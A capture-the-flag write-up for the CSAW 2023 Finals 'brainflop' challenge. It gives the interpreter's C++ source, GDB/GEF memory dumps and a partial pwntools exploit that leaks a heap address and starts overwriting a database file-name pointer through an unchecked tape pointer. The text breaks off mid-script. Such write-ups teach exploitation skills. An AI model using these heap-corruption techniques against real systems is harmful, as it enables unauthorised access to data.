---
layout: post
title: brainflop | CSAW CTF 2023 Finals
description: Pwning a Brainf*ck interpreter
author: Alexander Zhang
tags: pwn
---

This write-up is also posted on my website at <https://www.alexyzhang.dev/write-ups/csaw-finals-2023/brainflop/>.

## The Challenge

> You're invited to the closed beta of our new esoteric cloud programming environment, BRAINFLOP!
>
> Author: ex0dus (ToB)

We're given a binary and 300+ lines of C++ source code:

```c++
// clang++ -std=c++17 -O0 -g -Werror -fvisibility=hidden -flto
// -fsanitize=cfi-mfcall challenge.cpp -lsqlite3

#include <climits>
#include <ctime>
#include <iostream>
#include <limits>
#include <list>
#include <map>
#include <optional>
#include <stdexcept>
#include <string>
#include <vector>

#include <sqlite3.h>

#define LOOP_DEPTH_MAX 50

static const char *db_path = "actual.db";
static const char *sql_select = "SELECT TIMESTAMP, TAPESTATE FROM brainflop;";
static const char *sql_insert =
    "INSERT INTO brainflop (TASKID, TIMESTAMP, TAPESTATE) VALUES(?, ?, ?);";

bool parseYesOrNo(const std::string &message);
std::optional<int> parseNumericInput(void);

class BFTask {
public:
  BFTask(int id, unsigned short tapeSize, bool doBackup)
      : _id(id), tape(tapeSize, 0), sql_query(sql_select),
        instructionPointer(0), dataPointer(0), doBackup(doBackup) {}

  ~BFTask() {
    if (doBackup)
      performBackup();

    tape.clear();
    if (_sqlite3ErrMsg)
      sqlite3_free(_sqlite3ErrMsg);
    if (db)
      sqlite3_close(db);
  }

  void run(const std::string &program, bool deletePreviousState) {
    if (deletePreviousState) {
      tape.clear();
      loopStack.clear();
      instructionPointer = 0;
      dataPointer = 0;
    }

    while (instructionPointer < program.length()) {
      char command = program[instructionPointer];
      switch (command) {
      case '>':
        incrementDataPointer();
        break;
      case '<':
        decrementDataPointer();
        break;
      case '+':
        incrementCellValue();
        break;
      case '-':
        decrementCellValue();
        break;
      case '.':
        outputCellValue();
        break;
      case ',':
        inputCellValue();
        break;
      case '[':
        if (getCellValue() == 0) {
          size_t loopDepth = 1;
          while (loopDepth > 0) {
            if (loopDepth == LOOP_DEPTH_MAX)
              throw std::runtime_error("nested loop depth exceeded.");

            instructionPointer++;
            if (program[instructionPointer] == '[') {
              loopDepth++;
            } else if (program[instructionPointer] == ']') {
              loopDepth--;
            }
          }
        } else {
          loopStack.push_back(instructionPointer);
        }
        break;
      case ']':
        if (getCellValue() != 0) {
          instructionPointer = loopStack.back() - 1;
        } else {
          loopStack.pop_back();
        }
        break;
      default:
        break;
      }
      instructionPointer++;
    }
  }

private:
  int _id;

  // TODO: delete me!
  //std::string debug_db_path = "todo_delete_this.db";

  sqlite3 *db;
  char *_sqlite3ErrMsg = 0;
  const std::string sql_query;

  bool doBackup;
  const char *db_file = db_path;

  std::vector<unsigned char> tape;
  std::list<size_t> loopStack;

  size_t instructionPointer;
  int dataPointer;

  /* ============== backup to sqlite3 ============== */

  static int _backup_callback(void *data, int argc, char **argv,
                              char **azColName) {
    for (int i = 0; i < argc; i++) {
      std::cout << azColName[i] << " = " << (argv[i] ? argv[i] : "NULL")
                << "\n";
    }
    std::cout << std::endl;
    return 0;
  }

  void performBackup(void) {
    sqlite3_stmt *stmt;
    std::string tape_str;

    std::cout << "Performing backup for task " << _id << std::endl;

    time_t tm = time(NULL);
    struct tm *current_time = localtime(&tm);
    char *timestamp = asctime(current_time);

    // create the table if it doesn't exist
    if (sqlite3_open(db_file, &db))
      throw std::runtime_error(std::string("sqlite3_open: ") +
                               sqlite3_errmsg(db));

    std::string prepare_table_stmt = "CREATE TABLE IF NOT EXISTS brainflop("
                                     "ID INT PRIMARY          KEY,"
                                     "TASKID		              INT,"
                                     "TIMESTAMP               TEXT,"
                                     "TAPESTATE               TEXT"
                                     " );";

    if (sqlite3_exec(db, prepare_table_stmt.c_str(), NULL, 0,
                     &_sqlite3ErrMsg) != SQLITE_OK)
      throw std::runtime_error(std::string("sqlite3_exec: ") + _sqlite3ErrMsg);

    // insert into database
    if (sqlite3_prepare_v2(db, sql_insert, -1, &stmt, NULL) != SQLITE_OK)
      throw std::runtime_error(std::string("sqlite3_prepare_v2: ") +
                               sqlite3_errmsg(db));

    tape_str.push_back('|');
    for (auto i : tape) {
      tape_str += std::to_string(int(i));
      tape_str.push_back('|');
    }

    sqlite3_bind_int(stmt, 1, _id);
    sqlite3_bind_text(stmt, 2, timestamp, -1, SQLITE_STATIC);
    sqlite3_bind_text(stmt, 3, tape_str.c_str(), -1, SQLITE_STATIC);

    if (sqlite3_step(stmt) != SQLITE_DONE)
      throw std::runtime_error(std::string("sqlite3_step: ") +
                               sqlite3_errmsg(db));

    sqlite3_finalize(stmt);

    // display contents
    if (sqlite3_exec(db, sql_query.c_str(), _backup_callback, 0,
                     &_sqlite3ErrMsg) != SQLITE_OK)
      throw std::runtime_error(std::string("sqlite3_exec: ") + _sqlite3ErrMsg);
  }

  /* ============== brainflop operations ============== */

  void incrementDataPointer() { dataPointer++; }

  void decrementDataPointer() { dataPointer--; }

  void incrementCellValue() { tape[dataPointer]++; }

  void decrementCellValue() { tape[dataPointer]--; }

  void outputCellValue() { std::cout.put(tape[dataPointer]); }

  void inputCellValue() {
    char inputChar;
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin.get(inputChar);
    tape[dataPointer] = inputChar;
  }

  unsigned char getCellValue() const { return tape[dataPointer]; }
};

void runNewTrial(int id, std::map<int, BFTask *> &task_map) {
  unsigned short tapeSize;
  bool doBackup;
  std::string program;

  tapeSize = 20;
  doBackup =
      parseYesOrNo("[>] Should BRAINFLOP SQL backup mode be enabled (y/n) ? ");

  std::cout
      << "[>] Enter BRAINFLOP program (Enter to finish input and start run): ";
  std::cin >> program;

  BFTask *task = new BFTask(id, tapeSize, doBackup);
  task->run(program, false);
  task_map.insert(std::pair<int, BFTask *>(id, task));
}

void runOnPreviousTrial(int id, std::map<int, BFTask *> &task_map) {
  bool deletePreviousState;
  std::string program;

  BFTask *task = task_map.at(id);
  if (!task) {
    throw std::runtime_error("cannot match ID in task mapping");
  }

  deletePreviousState = parseYesOrNo(
      "[*] Should the previous BRAINFLOP tape state be deleted (y/n) ? ");

  std::cout
      << "[>] Enter BRAINFLOP program (Enter to finish input and start run): ";
  std::cin >> program;

  task->run(program, deletePreviousState);
}

bool parseYesOrNo(const std::string &message) {
  char userAnswer;
  do {
    std::cout << message;
    std::cin >> userAnswer;
  } while (!std::cin.fail() && userAnswer != 'y' && userAnswer != 'n');

  if (userAnswer == 'y')
    return true;

  return false;
}

std::optional<int> parseNumericInput(void) {
  int number;
  try {
    if (!(std::cin >> number)) {
      // Input error or EOF (Ctrl+D)
      if (std::cin.eof()) {
        std::cout << "EOF detected. Exiting." << std::endl;
        exit(-1);
      } else {
        // Clear the error state and ignore the rest of the line
        std::cin.clear();
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        std::cerr << "Invalid input. Please enter an integer." << std::endl;
        return {};
      }
    }
  } catch (const std::exception &e) {
    std::cerr << "An error occurred: " << e.what() << std::endl;
    return {};
  }
  return number;
}

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);

  int id_counter = 1;
  int free_trial_left = 3;
  std::map<int, BFTask *> task_mapping;

  while (true) {
    std::cout << "\n\n[*] WHAT WOULD YOU LIKE TO DO?\n"
              << "    (1) Execute a BRAINFLOP VM (" << free_trial_left
              << " free trials left).\n"
              << "    (2) Open an existing BRAINFLOP VM.\n"
              << "    (3) Goodbye.\n"
              << ">> ";

    if (auto in = parseNumericInput()) {
      switch (*in) {
      case 1:
        if (free_trial_left == 0) {
          std::cerr << "[!] NO MORE VMS FOR YOU!!\n";
          break;
        }
        runNewTrial(id_counter, task_mapping);

        id_counter++;
        free_trial_left--;
        break;

      case 2:
        std::cout << "[*] Enter node ID number >> ";
        if (auto id = parseNumericInput()) {
          if (*id > free_trial_left || *id <= 0) {
            std::cerr << "[!] INVALID NODE ID!!\n";
            break;
          }
          runOnPreviousTrial(*id, task_mapping);
        }
        break;

      case 3:
        std::cout << "Goodbye!\n";
        goto finalize;

      default:
        break;
      }
    }
  }

finalize:

  // free task map items
  for (auto const &[id, task] : task_mapping) {
    task->~BFTask();
  }
  return 0;
}
```

The complexity made the challenge seem intimidating at first.
There's a lot of code, [SQLite](https://www.sqlite.org/index.html) is involved, and the comment at the beginning indicates that the binary was compiled with a [Clang CFI](https://clang.llvm.org/docs/ControlFlowIntegrity.html) option that detects "Indirect call via a member function pointer with wrong dynamic type."
The program implements an interpreter for the [Brainf\*ck](https://en.wikipedia.org/wiki/Brainfuck) esoteric language in the `BFTask` class.
Users can create Brainf\*ck VMs, execute programs in them, and back up their state into an SQLite database in a file named `actual.db`.
A comment suggests that there is a secret database file named `todo_delete_this.db` that we should try to read:

```c++
// TODO: delete me!
//std::string debug_db_path = "todo_delete_this.db";
```

## Vulnerability

Brainf\*ck programs operate on a "tape" consisting of an array of bytes.
The tape is accessed through a "tape pointer" which points to one of the bytes and can be moved left or right.
In the code, there's nothing preventing the tape pointer (called `dataPointer`) from going past the ends of the tape.
The tape is stored on the heap in an `std::vector`, so we can leak or overwrite other data in the heap.
I also noticed some other bugs such as the code reading and writing to the tape after calling `tape.clear()`, but we didn't need them for our solution.

Our goal is to leak the `todo_delete_this.db` database, and the `BFTask::performBackup` function has code that will display the contents of the backup database.
If we can change the file name of the backup database, then we can get the function to print out `todo_delete_this.db` instead.
The name of the backup database file is stored in a string literal which can't be overwritten, but each `BFTask` instance has its own `db_file` member pointing to the string:

```c++
static const char *db_path = "actual.db";
//...
class BFTask {
  //...
  const char *db_file = db_path;
  //...
}
```

Since the `BFTask` objects are allocated on the heap, we can overwrite the `db_file` pointer in one of them to make it point to the secret database file name.
We need to have the string `todo_delete_this.db` at a known address, which can be achieved by putting it on the heap and leaking a heap address.

## Exploitation

### Heap leak

I created a `BFTask` and then looked for heap pointers near the tape, but I couldn't find any.
I figured that if I cause some more heap operations then they might leave a heap poiner around, so I made the `BFTask` execute a long program first and then examined the heap near the tape.
This time, I found a heap pointer 0x48 bytes after the start of the tape:

<pre><code><font color="#26A269"><b>gef➤  </b></font>b BFTask::run
Breakpoint 1 at <font color="#0071FF">0x55f65411da6f</font>
<font color="#26A269"><b>gef➤  </b></font>c
Continuing.
...
<font color="#A2734C">BFTask::run</font> (<font color="#2AA1B3">this</font>=0x55f654799330, <font color="#2AA1B3">program</font>=..., <font color="#2AA1B3">deletePreviousState</font>=0x1)
    at <font color="#26A269">challenge.cpp</font>:52
52      <font color="#0071FF"><b>while</b></font> <font color="#C01C28">(</font>instructionPointer <font color="#C01C28">&lt;</font> program<font color="#C01C28">.</font><b>length</b><font color="#C01C28">())</font> <font color="#C01C28">{</font>

[ Legend: <font color="#C01C28"><b>Modified register</b></font> | <font color="#C01C28">Code</font> | <font color="#26A269">Heap</font> | <font color="#A347BA">Stack</font> | <font color="#A2734C">String</font> ]
<font color="#585858"><b>───────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">registers</font><font color="#585858"><b> ────</b></font>
<font color="#0071FF">$rax   </font>: <font color="#26A269">0x000055f654799330</font>  →  0x0000000500000001
<font color="#0071FF">$rbx   </font>: <font color="#A347BA">0x00007ffc3928a258</font>  →  <font color="#A347BA">0x00007ffc3928a553</font>  →  <font color="#A2734C">&quot;/home/alex/brainflop/chal/challenge_patched&quot;</font>
<font color="#C01C28"><b>$rcx   </b></font>: <font color="#26A269">0x000055f654799390</font>  →  <font color="#26A269">0x000055f654799390</font>  →  [loop detected]
<font color="#C01C28"><b>$rdx   </b></font>: <font color="#26A269">0x000055f654799500</font>  →  0x0000000000000000
<font color="#0071FF">$rsp   </font>: <font color="#A347BA">0x00007ffc39289f40</font>  →  0x01007ffc39289f90
<font color="#0071FF">$rbp   </font>: <font color="#A347BA">0x00007ffc39289f90</font>  →  <font color="#A347BA">0x00007ffc3928a050</font>  →  <font color="#A347BA">0x00007ffc3928a140</font>  →  0x0000000000000001
<font color="#C01C28"><b>$rsi   </b></font>: <font color="#26A269">0x000055f654799514</font>  →  0x0000004100000000
<font color="#C01C28"><b>$rdi   </b></font>: <font color="#26A269">0x000055f654799390</font>  →  <font color="#26A269">0x000055f654799390</font>  →  [loop detected]
<font color="#C01C28"><b>$rip   </b></font>: <font color="#C01C28">0x000055f65411daa5</font>  →  <font color="#585858"><b> jmp 0x55f65411daa7 &lt;_ZN6BFTask3runERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEb+87&gt;</b></font>
<font color="#0071FF">$r8    </font>: <font color="#26A269">0x000055f654787010</font>  →  0x0001000000010000
<font color="#0071FF">$r9    </font>: 0x7               
<font color="#0071FF">$r10   </font>: <font color="#26A269">0x000055f6547992b0</font>  →  0x000000055f654799
<font color="#0071FF">$r11   </font>: 0x246             
<font color="#0071FF">$r12   </font>: 0x0               
<font color="#0071FF">$r13   </font>: <font color="#A347BA">0x00007ffc3928a268</font>  →  <font color="#A347BA">0x00007ffc3928a57f</font>  →  <font color="#A2734C">&quot;SHELL=/bin/bash&quot;</font>
<font color="#0071FF">$r14   </font>: <font color="#C01C28">0x000055f654125d58</font>  →  <font color="#C01C28">0x000055f65411d570</font>  →  <font color="#585858"><b> endbr64 </b></font>
<font color="#0071FF">$r15   </font>: 0x00007fabe5702000  →  0x00007fabe57032d0  →  <font color="#C01C28">0x000055f65411a000</font>  →  <font color="#585858"><b> jg 0x55f65411a047</b></font>
<font color="#C01C28"><b>$eflags</b></font>: [zero carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow resume virtualx86 identification]
<font color="#0071FF">$cs</font>: 0x33 <font color="#0071FF">$ss</font>: 0x2b <font color="#0071FF">$ds</font>: 0x00 <font color="#0071FF">$es</font>: 0x00 <font color="#0071FF">$fs</font>: 0x00 <font color="#0071FF">$gs</font>: 0x00 
<font color="#585858"><b>───────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">stack</font><font color="#585858"><b> ────</b></font>
<font color="#2AA1B3">0x00007ffc39289f40</font>│+0x0000: 0x01007ffc39289f90 <font color="#0071FF"><b> ← $rsp</b></font>
<font color="#2AA1B3">0x00007ffc39289f48</font>│+0x0008: 0x010055f654122109
<font color="#2AA1B3">0x00007ffc39289f50</font>│+0x0010: 0x00007fabe5469da0  →  0x0000000000000002
<font color="#2AA1B3">0x00007ffc39289f58</font>│+0x0018: <font color="#26A269">0x000055f654799330</font>  →  0x0000000500000001
<font color="#2AA1B3">0x00007ffc39289f60</font>│+0x0020: <font color="#A347BA">0x00007ffc3928a268</font>  →  <font color="#A347BA">0x00007ffc3928a57f</font>  →  <font color="#A2734C">&quot;SHELL=/bin/bash&quot;</font>
<font color="#2AA1B3">0x00007ffc39289f68</font>│+0x0028: <font color="#A347BA">0x00007ffc3928a258</font>  →  <font color="#A347BA">0x00007ffc3928a553</font>  →  <font color="#A2734C">&quot;/home/alex/brainflop/chal/challenge_patched&quot;</font>
<font color="#2AA1B3">0x00007ffc39289f70</font>│+0x0030: <font color="#A347BA">0x00007ffc3928a050</font>  →  <font color="#A347BA">0x00007ffc3928a140</font>  →  0x0000000000000001
<font color="#2AA1B3">0x00007ffc39289f78</font>│+0x0038: 0x0100000000000000
<font color="#585858"><b>─────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">code:x86:64</font><font color="#585858"><b> ────</b></font>
   <font color="#585858"><b>0x55f65411da8f                  mov    rax, QWORD PTR [rbp-0x38]</b></font>
   <font color="#585858"><b>0x55f65411da93                  mov    QWORD PTR [rax+0x78], 0x0</b></font>
   <font color="#585858"><b>0x55f65411da9b                  mov    DWORD PTR [rax+0x80], 0x0</b></font>
 <font color="#26A269">→ 0x55f65411daa5                  jmp    0x55f65411daa7 &lt;_ZN6BFTask3runERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEb+87&gt;</font>
   0x55f65411daa7                  mov    rax, QWORD PTR [rbp-0x38]
   0x55f65411daab                  mov    rax, QWORD PTR [rax+0x78]
   0x55f65411daaf                  mov    QWORD PTR [rbp-0x40], rax
   0x55f65411dab3                  mov    rdi, QWORD PTR [rbp-0x10]
   0x55f65411dab7                  call   0x55f65411d3d0 &lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE6lengthEv@plt&gt;
<font color="#585858"><b>─────────────────────────────────────────────────── </b></font><font color="#2AA1B3">source:challenge.cpp+52</font><font color="#585858"><b> ────</b></font>
 <font color="#585858"><b>    47</b></font> <font color="#585858"><b>       loopStack.clear();</b></font>
 <font color="#585858"><b>    48</b></font> <font color="#585858"><b>       instructionPointer = 0;</b></font>
 <font color="#585858"><b>    49</b></font> <font color="#585858"><b>       dataPointer = 0;</b></font>
 <font color="#585858"><b>    50</b></font> <font color="#585858"><b>     }</b></font>
 <font color="#585858"><b>    51</b></font> <font color="#585858"><b> </b></font>
<font color="#26A269"> →   52</font>    <font color="#26A269">     while (instructionPointer &lt; program.length()) {</font>
     53        char command = program[instructionPointer];
     54        switch (command) {
     55        case &apos;&gt;&apos;:
     56          incrementDataPointer();
     57          break;
<font color="#585858"><b>─────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">threads</font><font color="#585858"><b> ────</b></font>
[<font color="#26A269"><b>#0</b></font>] Id 1, Name: &quot;challenge_patch&quot;, <font color="#C01C28"><b>stopped</b></font> <font color="#0071FF">0x55f65411daa5</font> in <font color="#A2734C"><b>BFTask::run</b></font> (), reason: <font color="#A347BA"><b>TEMPORARY BREAKPOINT</b></font>
<font color="#585858"><b>───────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">trace</font><font color="#585858"><b> ────</b></font>
[<font color="#26A269"><b>#0</b></font>] 0x55f65411daa5 → <font color="#26A269">BFTask::run</font>(<font color="#A2734C">this</font>=0x55f654799330, <font color="#A2734C">program</font>=@0x7ffc39289ff8, <font color="#A2734C">deletePreviousState</font>=0x1)
[<font color="#A347BA"><b>#1</b></font>] 0x55f65412018a → <font color="#26A269">runOnPreviousTrial</font>(<font color="#A2734C">id</font>=0x1, <font color="#A2734C">task_map</font>=@0x7ffc3928a100)
[<font color="#A347BA"><b>#2</b></font>] 0x55f654120843 → <font color="#26A269">main</font>()
<font color="#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></font>
<font color="#26A269"><b>gef➤  </b></font>deref tape._M_impl._M_start
<font color="#2AA1B3">0x000055f654799500</font>│+0x0000: 0x0000000000000000 <font color="#0071FF"><b> ← $rdx</b></font>
<font color="#2AA1B3">0x000055f654799508</font>│+0x0008: 0x0000000000000000
<font color="#2AA1B3">0x000055f654799510</font>│+0x0010: 0x0000000000000000
<font color="#2AA1B3">0x000055f654799518</font>│+0x0018: 0x0000000000000041 (&quot;<font color="#A2734C">A</font>&quot;?)
<font color="#2AA1B3">0x000055f654799520</font>│+0x0020: 0x0000000000000001
<font color="#2AA1B3">0x000055f654799528</font>│+0x0028: <font color="#A347BA">0x00007ffc3928a108</font>  →  0x00007fab00000000
<font color="#2AA1B3">0x000055f654799530</font>│+0x0030: 0x0000000000000000
<font color="#2AA1B3">0x000055f654799538</font>│+0x0038: 0x0000000000000000
<font color="#2AA1B3">0x000055f654799540</font>│+0x0040: 0x0000000000000001
<font color="#2AA1B3">0x000055f654799548</font>│+0x0048: <font color="#26A269">0x000055f654799330</font>  →  0x0000000500000001
</code></pre>

I wrote a script with a Brainf\*ck program that prints the pointer out:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.38.so")

context.binary = exe

if args.REMOTE:
    r = remote("pwn.csaw.io", 9999)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

# Cause some heap allocations for leaking heap address
r.sendlineafter(b'>> ', b'1')  # Create new VM
r.sendlineafter(b' ? ', b'n')  # Disable backups
r.sendlineafter(b'): ', b'A' * 200)  # Long BF program to cause allocations

# Leak heap address
r.sendlineafter(b'>> ', b'2')  # Reuse existing VM
r.sendlineafter(b'>> ', b'1')  # VM index
r.sendlineafter(b' ? ', b'y')  # Enable backups (I don't remember why)
r.sendlineafter(b'): ', b'>' * 0x48 + b'.>' * 8)  # BF program to print pointer
leek = u64(r.recv(8))
log.info(f'{hex(leek)=}')
```

Now we have a heap leak:

<pre><code>[alex@ctf chal]$ ./solve.py
...
[<font color="#26A269"><b>+</b></font>] Starting local process &apos;/home/alex/brainflop/chal/challenge_patched&apos;: pid 2257
[<font color="#0071FF"><b>*</b></font>] hex(leek)=&apos;0x5633f3846330&apos;
</code></pre>

### Overwriting the database file name

I used GDB to find the offset from the tape to the database file name pointer:

<pre><code><font color="#26A269"><b>gef➤  </b></font>b BFTask::run
Breakpoint 1 at <font color="#0071FF">0x563e44046a6f</font>
<font color="#26A269"><b>gef➤  </b></font>c
Continuing.
...
<font color="#A2734C">BFTask::run</font> (<font color="#2AA1B3">this</font>=0x563e44eec560, <font color="#2AA1B3">program</font>=..., <font color="#2AA1B3">deletePreviousState</font>=0x0)
    at <font color="#26A269">challenge.cpp</font>:52
52      <font color="#0071FF"><b>while</b></font> <font color="#C01C28">(</font>instructionPointer <font color="#C01C28">&lt;</font> program<font color="#C01C28">.</font><b>length</b><font color="#C01C28">())</font> <font color="#C01C28">{</font>

[ Legend: <font color="#C01C28"><b>Modified register</b></font> | <font color="#C01C28">Code</font> | <font color="#26A269">Heap</font> | <font color="#A347BA">Stack</font> | <font color="#A2734C">String</font> ]
<font color="#585858"><b>───────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">registers</font><font color="#585858"><b> ────</b></font>
<font color="#0071FF">$rax   </font>: <font color="#26A269">0x0000563e44eec560</font>  →  0x0000000500000002
<font color="#0071FF">$rbx   </font>: <font color="#A347BA">0x00007ffc3cd4e0a8</font>  →  <font color="#A347BA">0x00007ffc3cd4e553</font>  →  <font color="#A2734C">&quot;/home/alex/brainflop/chal/challenge_patched&quot;</font>
<font color="#0071FF">$rcx   </font>: <font color="#26A269">0x0000563e44eecc04</font>  →  0x0000345100000000
<font color="#0071FF">$rdx   </font>: 0x0               
<font color="#0071FF">$rsp   </font>: <font color="#A347BA">0x00007ffc3cd4dd60</font>  →  0x00000002001401b0
<font color="#0071FF">$rbp   </font>: <font color="#A347BA">0x00007ffc3cd4ddb0</font>  →  <font color="#A347BA">0x00007ffc3cd4dea0</font>  →  <font color="#A347BA">0x00007ffc3cd4df90</font>  →  0x0000000000000001
<font color="#0071FF">$rsi   </font>: <font color="#A347BA">0x00007ffc3cd4de48</font>  →  <font color="#26A269">0x0000563e44ef0060</font>  →  <font color="#A2734C">&quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[...]&quot;</font>
<font color="#0071FF">$rdi   </font>: <font color="#26A269">0x0000563e44eec560</font>  →  0x0000000500000002
<font color="#C01C28"><b>$rip   </b></font>: <font color="#C01C28">0x0000563e44046aa5</font>  →  <font color="#585858"><b> jmp 0x563e44046aa7 &lt;_ZN6BFTask3runERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEb+87&gt;</b></font>
<font color="#0071FF">$r8    </font>: 0xffffffffffffffa0
<font color="#0071FF">$r9    </font>: 0x20              
<font color="#0071FF">$r10   </font>: <font color="#26A269">0x0000563e44ef0050</font>  →  0x0000000000003450 (&quot;<font color="#A2734C">P4</font>&quot;?)
<font color="#0071FF">$r11   </font>: 0x40              
<font color="#0071FF">$r12   </font>: 0x0               
<font color="#0071FF">$r13   </font>: <font color="#A347BA">0x00007ffc3cd4e0b8</font>  →  <font color="#A347BA">0x00007ffc3cd4e57f</font>  →  <font color="#A2734C">&quot;SHELL=/bin/bash&quot;</font>
<font color="#0071FF">$r14   </font>: <font color="#C01C28">0x0000563e4404ed58</font>  →  <font color="#C01C28">0x0000563e44046570</font>  →  <font color="#585858"><b> endbr64 </b></font>
<font color="#0071FF">$r15   </font>: 0x00007f9a70051000  →  0x00007f9a700522d0  →  <font color="#C01C28">0x0000563e44043000</font>  →  <font color="#585858"><b> jg 0x563e44043047</b></font>
<font color="#0071FF">$eflags</font>: [<b>ZERO</b> carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow resume virtualx86 identification]
<font color="#0071FF">$cs</font>: 0x33 <font color="#0071FF">$ss</font>: 0x2b <font color="#0071FF">$ds</font>: 0x00 <font color="#0071FF">$es</font>: 0x00 <font color="#0071FF">$fs</font>: 0x00 <font color="#0071FF">$gs</font>: 0x00 
<font color="#585858"><b>───────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">stack</font><font color="#585858"><b> ────</b></font>
<font color="#2AA1B3">0x00007ffc3cd4dd60</font>│+0x0000: 0x00000002001401b0 <font color="#0071FF"><b> ← $rsp</b></font>
<font color="#2AA1B3">0x00007ffc3cd4dd68</font>│+0x0008: <font color="#26A269">0x0000563e44eec560</font>  →  0x0000000500000002
<font color="#2AA1B3">0x00007ffc3cd4dd70</font>│+0x0010: <font color="#A347BA">0x00007ffc3cd4dd60</font>  →  0x00000002001401b0
<font color="#2AA1B3">0x00007ffc3cd4dd78</font>│+0x0018: <font color="#26A269">0x0000563e44eec560</font>  →  0x0000000500000002
<font color="#2AA1B3">0x00007ffc3cd4dd80</font>│+0x0020: <font color="#A347BA">0x00007ffc3cd4e0b8</font>  →  <font color="#A347BA">0x00007ffc3cd4e57f</font>  →  <font color="#A2734C">&quot;SHELL=/bin/bash&quot;</font>
<font color="#2AA1B3">0x00007ffc3cd4dd88</font>│+0x0028: <font color="#A347BA">0x00007ffc3cd4dd50</font>  →  0x0000000000002710
<font color="#2AA1B3">0x00007ffc3cd4dd90</font>│+0x0030: <font color="#A347BA">0x00007ffc3cd4dd50</font>  →  0x0000000000002710
<font color="#2AA1B3">0x00007ffc3cd4dd98</font>│+0x0038: <font color="#A347BA">0x00007ffc3cd4dea0</font>  →  <font color="#A347BA">0x00007ffc3cd4df90</font>  →  0x0000000000000001
<font color="#585858"><b>─────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">code:x86:64</font><font color="#585858"><b> ────</b></font>
   <font color="#585858"><b>0x563e44046a8f                  mov    rax, QWORD PTR [rbp-0x38]</b></font>
   <font color="#585858"><b>0x563e44046a93                  mov    QWORD PTR [rax+0x78], 0x0</b></font>
   <font color="#585858"><b>0x563e44046a9b                  mov    DWORD PTR [rax+0x80], 0x0</b></font>
 <font color="#26A269">→ 0x563e44046aa5                  jmp    0x563e44046aa7 &lt;_ZN6BFTask3runERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEb+87&gt;</font>
   0x563e44046aa7                  mov    rax, QWORD PTR [rbp-0x38]
   0x563e44046aab                  mov    rax, QWORD PTR [rax+0x78]
   0x563e44046aaf                  mov    QWORD PTR [rbp-0x40], rax
   0x563e44046ab3                  mov    rdi, QWORD PTR [rbp-0x10]
   0x563e44046ab7                  call   0x563e440463d0 &lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE6lengthEv@plt&gt;
<font color="#585858"><b>─────────────────────────────────────────────────── </b></font><font color="#2AA1B3">source:challenge.cpp+52</font><font color="#585858"><b> ────</b></font>
 <font color="#585858"><b>    47</b></font> <font color="#585858"><b>       loopStack.clear();</b></font>
 <font color="#585858"><b>    48</b></font> <font color="#585858"><b>       instructionPointer = 0;</b></font>
 <font color="#585858"><b>    49</b></font> <font color="#585858"><b>       dataPointer = 0;</b></font>
 <font color="#585858"><b>    50</b></font> <font color="#585858"><b>     }</b></font>
 <font color="#585858"><b>    51</b></font> <font color="#585858"><b> </b></font>
<font color="#26A269"> →   52</font>    <font color="#26A269">     while (instructionPointer &lt; program.length()) {</font>
     53        char command = program[instructionPointer];
     54        switch (command) {
     55        case &apos;&gt;&apos;:
     56          incrementDataPointer();
     57          break;
<font color="#585858"><b>─────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">threads</font><font color="#585858"><b> ────</b></font>
[<font color="#26A269"><b>#0</b></font>] Id 1, Name: &quot;challenge_patch&quot;, <font color="#C01C28"><b>stopped</b></font> <font color="#0071FF">0x563e44046aa5</font> in <font color="#A2734C"><b>BFTask::run</b></font> (), reason: <font color="#A347BA"><b>TEMPORARY BREAKPOINT</b></font>
<font color="#585858"><b>───────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">trace</font><font color="#585858"><b> ────</b></font>
[<font color="#26A269"><b>#0</b></font>] 0x563e44046aa5 → <font color="#26A269">BFTask::run</font>(<font color="#A2734C">this</font>=0x563e44eec560, <font color="#A2734C">program</font>=@0x7ffc3cd4de48, <font color="#A2734C">deletePreviousState</font>=0x0)
[<font color="#A347BA"><b>#1</b></font>] 0x563e440466af → <font color="#26A269">runNewTrial</font>(<font color="#A2734C">id</font>=0x2, <font color="#A2734C">task_map</font>=@0x7ffc3cd4df50)
[<font color="#A347BA"><b>#2</b></font>] 0x563e440497a4 → <font color="#26A269">main</font>()
<font color="#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></font>
<font color="#26A269"><b>gef➤  </b></font>p (void*)tape._M_impl._M_start - (void*)&amp;db_file
$1 = 0x650
</code></pre>

I made a Brainf\*ck program to overwrite the pointer, and appended the string `todo_delete_this.db` to the end.
Then I used GEF's `grep` command to find the address of the string, and subtract the leaked heap address to find the offset that needs to be added.
Here's the resulting script:

```python
# Overwrite database file name
r.sendlineafter(b'>> ', b'1')  # Create new VM
